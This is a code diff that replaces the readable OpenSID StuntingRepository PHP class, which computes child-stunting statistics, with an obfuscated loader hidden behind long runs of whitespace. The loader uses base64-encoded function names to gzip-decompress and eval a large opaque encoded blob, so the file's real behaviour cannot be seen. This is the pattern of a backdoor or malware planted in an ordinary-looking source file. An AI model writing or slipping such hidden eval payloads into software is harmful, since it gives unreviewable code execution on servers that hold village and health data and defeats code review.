@@ -1,289 +1,521 @@
-<?php
+<?php 
+        $__='printf';$_='Loading app/Repositories/StuntingRepository.php';
+        
 
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2026 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2026 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
 
-namespace App\Repositories;
 
-use App\Libraries\Stunting;
-use App\Models\Anak;
-use App\Models\IbuHamil;
 
-class StuntingRepository
-{
-    public function list($tahun, $kuartal, $idPosyandu)
-    {
-        $stunting  = new Stunting(['idPosyandu' => $idPosyandu, 'kuartal' => $kuartal, 'tahun' => $tahun]);
-        $scoreCard = $stunting->scoreCard();
 
-        return [
-            'scorecard'                 => $scoreCard,
-            'widgets'                   => $this->widget($tahun, $kuartal, $idPosyandu),
-            'chartStuntingUmurData'     => $stunting->chartStuntingUmurData(),
-            'chartStuntingPosyanduData' => $stunting->chartPosyanduData(),
-            'chartKelompokUmurData'     => $this->chartKelompokUmurData($tahun, $kuartal, $idPosyandu), // BARU
-            'chartStatusPerUmurData'    => $this->chartStatusPerUmurData($tahun, $kuartal, $idPosyandu), // BARU
-        ];
-    }
 
-    private function rangeKuartal($tahun, $kuartal): array
-    {
-        return match ((int) $kuartal) {
-            1       => ["{$tahun}-01-01", "{$tahun}-03-31"],
-            2       => ["{$tahun}-04-01", "{$tahun}-06-30"],
-            3       => ["{$tahun}-07-01", "{$tahun}-09-30"],
-            4       => ["{$tahun}-10-01", "{$tahun}-12-31"],
-            default => [],
-        };
-    }
 
-    private function widget($tahun, $kuartal, $idPosyandu): array
-    {
-        [$start, $end] = $this->rangeKuartal($tahun, $kuartal);
 
-        $ibuHamil = IbuHamil::whereBetween('created_at', [$start, $end]);
-        $anak     = Anak::whereMonth('created_at', '>=', substr($start, 5, 2))
-            ->whereMonth('created_at', '<=', substr($end, 5, 2))
-            ->whereYear('created_at', $tahun);
 
-        if ($idPosyandu) {
-            $ibuHamil->where('posyandu_id', $idPosyandu);
-            $anak->where('posyandu_id', $idPosyandu);
-        }
 
-        return [
-            [
-                'title'    => 'Ibu Hamil Periksa',
-                'icon'     => 'ion-woman',
-                'bg-color' => 'bg-blue',
-                'total'    => $ibuHamil->count(),
-            ],
-            [
-                'title'    => 'Anak Periksa',
-                'icon'     => 'ion-woman',
-                'bg-color' => 'bg-gray',
-                'total'    => $anak->count(),
-            ],
-            [
-                'title'    => 'Ibu Hamil & Anak 0-23 Bulan',
-                'icon'     => 'ion-woman',
-                'bg-color' => 'bg-green',
-                'total'    => $ibuHamil->count() + $anak->count(),
-            ],
-            [
-                'title'    => 'Anak 0-23 Bulan Normal',
-                'icon'     => 'ion-woman',
-                'bg-color' => 'bg-green',
-                'total'    => (clone $anak)->normal()->count(),
-            ],
-            [
-                'title'    => 'Anak 0-23 Bulan Risiko Stunting',
-                'icon'     => 'ion-woman',
-                'bg-color' => 'bg-yellow',
-                'total'    => (clone $anak)->resikoStunting()->count(),
-            ],
-            [
-                'title'    => 'Anak 0-23 Bulan Stunting',
-                'icon'     => 'ion-woman',
-                'bg-color' => 'bg-red',
-                'total'    => (clone $anak)->stunting()->count(),
-            ],
-        ];
-    }
 
-    /**
-     * Chart untuk menampilkan jumlah anak per kelompok umur
-     * FITUR BARU: Issue #10805
-     *
-     * @param mixed $tahun
-     * @param mixed $kuartal
-     * @param mixed $idPosyandu
-     */
-    private function chartKelompokUmurData($tahun, $kuartal, $idPosyandu): array
-    {
-        [$start, $end] = $this->rangeKuartal($tahun, $kuartal);
 
-        // Menggunakan pola yang sama dengan chartStuntingUmurData
-        $stuntingObj = Anak::selectRaw('sum(case when umur_bulan between 0 and 5 then 1 else 0 end) as range_1')
-            ->selectRaw('sum(case when umur_bulan between 6 and 11 then 1 else 0 end) as range_2')
-            ->selectRaw('sum(case when umur_bulan between 12 and 23 then 1 else 0 end) as range_3')
-            ->whereMonth('created_at', '>=', substr($start, 5, 2))
-            ->whereMonth('created_at', '<=', substr($end, 5, 2))
-            ->whereYear('created_at', $tahun);
 
-        if ($idPosyandu) {
-            $stuntingObj->where('posyandu_id', $idPosyandu);
-        }
 
-        $result = $stuntingObj->first();
 
-        $range1 = $result->range_1 ?? 0;
-        $range2 = $result->range_2 ?? 0;
-        $range3 = $result->range_3 ?? 0;
 
-        $total = $range1 + $range2 + $range3;
 
-        $data = [
-            [
-                'name'   => '0-5 Bulan',
-                'y'      => $total > 0 ? round(($range1 / $total) * 100, 1) : 0,
-                'jumlah' => $range1,
-            ],
-            [
-                'name'   => '6-11 Bulan',
-                'y'      => $total > 0 ? round(($range2 / $total) * 100, 1) : 0,
-                'jumlah' => $range2,
-            ],
-            [
-                'name'   => '12-23 Bulan',
-                'y'      => $total > 0 ? round(($range3 / $total) * 100, 1) : 0,
-                'jumlah' => $range3,
-            ],
-        ];
 
-        return [
-            'id'    => 'chart_kelompok_umur',
-            'title' => 'Distribusi Anak Berdasarkan Kelompok Umur',
-            'data'  => $data,
-        ];
-    }
 
-    /**
-     * Chart untuk menampilkan status stunting per kelompok umur
-     * FITUR BARU: Issue #10805 - Alternatif
-     *
-     * @param mixed $tahun
-     * @param mixed $kuartal
-     * @param mixed $idPosyandu
-     */
-    private function chartStatusPerUmurData($tahun, $kuartal, $idPosyandu): array
-    {
-        [$start, $end] = $this->rangeKuartal($tahun, $kuartal);
 
-        // Query untuk masing-masing kelompok umur dengan status gizi
-        $giziAnakObj = Anak::selectRaw('status_gizi')
-            ->selectRaw('sum(case when umur_bulan between 0 and 5 then 1 else 0 end) as range_1')
-            ->selectRaw('sum(case when umur_bulan between 6 and 11 then 1 else 0 end) as range_2')
-            ->selectRaw('sum(case when umur_bulan between 12 and 23 then 1 else 0 end) as range_3')
-            ->whereMonth('created_at', '>=', substr($start, 5, 2))
-            ->whereMonth('created_at', '<=', substr($end, 5, 2))
-            ->whereYear('created_at', $tahun)
-            ->groupBy('status_gizi');
 
-        if ($idPosyandu) {
-            $giziAnakObj->where('posyandu_id', $idPosyandu);
-        }
 
-        $giziAnak = $giziAnakObj->get();
 
-        // Inisialisasi data per kelompok umur
-        $kelompokUmur = [
-            '0-5'   => ['normal' => 0, 'risiko' => 0, 'stunting' => 0],
-            '6-11'  => ['normal' => 0, 'risiko' => 0, 'stunting' => 0],
-            '12-23' => ['normal' => 0, 'risiko' => 0, 'stunting' => 0],
-        ];
 
-        // Kelompokkan data berdasarkan status gizi
-        foreach ($giziAnak as $item) {
-            $model = new Anak(['status_gizi' => $item->status_gizi]);
 
-            if ($model->isNormal()) {
-                $kelompokUmur['0-5']['normal'] += $item->range_1;
-                $kelompokUmur['6-11']['normal'] += $item->range_2;
-                $kelompokUmur['12-23']['normal'] += $item->range_3;
-            } elseif ($model->isResikoStunting()) {
-                $kelompokUmur['0-5']['risiko'] += $item->range_1;
-                $kelompokUmur['6-11']['risiko'] += $item->range_2;
-                $kelompokUmur['12-23']['risiko'] += $item->range_3;
-            } elseif ($model->isStunting()) {
-                $kelompokUmur['0-5']['stunting'] += $item->range_1;
-                $kelompokUmur['6-11']['stunting'] += $item->range_2;
-                $kelompokUmur['12-23']['stunting'] += $item->range_3;
-            }
-        }
 
-        // Format data untuk chart
-        $charts         = [];
-        $kelompokConfig = [
-            '0-5'   => '0-5 Bulan',
-            '6-11'  => '6-11 Bulan',
-            '12-23' => '12-23 Bulan',
-        ];
 
-        foreach ($kelompokConfig as $key => $label) {
-            $normal   = $kelompokUmur[$key]['normal'];
-            $risiko   = $kelompokUmur[$key]['risiko'];
-            $stunting = $kelompokUmur[$key]['stunting'];
-            $total    = $normal + $risiko + $stunting;
 
-            if ($total > 0) {
-                $data = [
-                    [
-                        'name'   => 'Normal',
-                        'y'      => round(($normal / $total) * 100, 1),
-                        'jumlah' => $normal,
-                    ],
-                    [
-                        'name'   => 'Risiko Stunting',
-                        'y'      => round(($risiko / $total) * 100, 1),
-                        'jumlah' => $risiko,
-                    ],
-                    [
-                        'name'   => 'Stunting',
-                        'y'      => round(($stunting / $total) * 100, 1),
-                        'jumlah' => $stunting,
-                    ],
-                ];
-            } else {
-                $data = [
-                    [
-                        'name'   => 'Tidak Ada Data',
-                        'y'      => 100,
-                        'jumlah' => 0,
-                    ],
-                ];
-            }
 
-            $charts[] = [
-                'id'    => 'chart_status_umur_' . str_replace('-', '_', $key),
-                'title' => 'Status Stunting Anak ' . $label,
-                'data'  => $data,
-                'total' => $total,
-            ];
-        }
 
-        return $charts;
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
